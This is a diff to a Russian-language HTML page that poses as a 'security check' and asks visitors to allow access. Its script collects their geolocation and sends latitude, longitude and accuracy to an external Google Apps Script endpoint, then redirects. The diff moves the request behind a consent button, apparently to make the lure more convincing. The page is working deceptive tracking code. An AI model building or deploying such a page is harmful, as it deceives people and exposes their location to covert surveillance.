@@ -23,6 +23,16 @@
       width: 50px;
       height: 50px;
       animation: spin 1s linear infinite;
+      display: none; /* Скрыт по умолчанию */
+    }
+    #consentBtn {
+      padding: 12px 24px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 20px;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -32,10 +42,30 @@
 </head>
 <body>
   <h2>Проверка безопасности</h2>
-  <p>Пожалуйста, разрешите доступ для продолжения</p>
+  
+  <!-- Кнопка для запуска процесса -->
+  <button id="consentBtn">Разрешить доступ</button>
   <div class="loader"></div>
 
   <script>
+    const loader = document.querySelector('.loader');
+    const consentBtn = document.getElementById('consentBtn');
+
+    // Функция запроса геолокации
+    function requestGeolocation() {
+      loader.style.display = 'block'; // Показать лоадер
+      consentBtn.style.display = 'none'; // Скрыть кнопку
+
+      navigator.geolocation.getCurrentPosition(
+        sendLocation,
+        locationError,
+        {
+          enableHighAccuracy: false,
+          timeout: 20000
+        }
+      );
+    }
+
     function sendLocation(pos) {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
@@ -44,18 +74,24 @@
       const url = `https://script.google.com/macros/s/AKfycbxK3sFmC2YreooOCiK9jU7lLFwMlt7NflHTzU5UUY6FesXfQDYOkg5RZUy2eobocL16/exec?lat=${lat}&lon=${lon}&acc=${acc}`;
 
       fetch(url)
-        .then(res => console.log("Успешно"))
-        .catch(err => console.error("Ошибка при отправке:", err));
+        .then(res => {
+          console.log("Успешно");
+          window.location.href = "/next-page.html"; // Редирект после успеха
+        })
+        .catch(err => {
+          console.error("Ошибка при отправке:", err);
+          alert("Ошибка соединения с сервером");
+        });
     }
 
     function locationError(err) {
-      alert("Ошибка доступа" + err.message);
+      loader.style.display = 'none';
+      consentBtn.style.display = 'block';
+      alert("Ошибка доступа: " + err.message);
     }
 
-    navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
-      enableHighAccuracy: false,
-      timeout: 30000
-    });
+    // Запрос запускается только по клику
+    consentBtn.addEventListener('click', requestGeolocation);
   </script>
 </body>
 </html>
